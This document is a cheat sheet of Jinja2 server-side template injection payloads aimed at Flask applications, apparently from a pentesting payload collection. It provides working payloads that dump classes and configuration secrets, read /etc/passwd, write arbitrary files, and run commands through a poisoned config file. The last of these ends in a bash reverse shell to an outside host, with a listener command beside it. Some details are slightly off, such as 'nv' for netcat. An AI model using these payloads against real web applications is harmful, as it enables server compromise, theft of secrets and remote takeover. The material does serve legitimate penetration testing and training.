# Templates Injections

Template injection allows an attacker to include template code into an existant (or not) template.

## Jinja2
[Official website](http://jinja.pocoo.org/)
> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.

Basic injection
```
{{4*4}}[[5*5]]
```

Jinja2 is used by Python Web Frameworks such as Django or Flask.
The above injections have been tested on Flask application.
#### Template format
```
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

#### Dump all used classes
```
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

#### Dump all config variables
```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

#### Read remote file
```
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

#### Write into remote file
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

#### Remote Code Execution via reverse shell
Listen for connexion
```
nv -lnvp 8000
```
Inject this template
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config
{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
```

#### Ressources & Sources
[https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)

#### Training
[https://w3challs.com/](https://w3challs.com/)
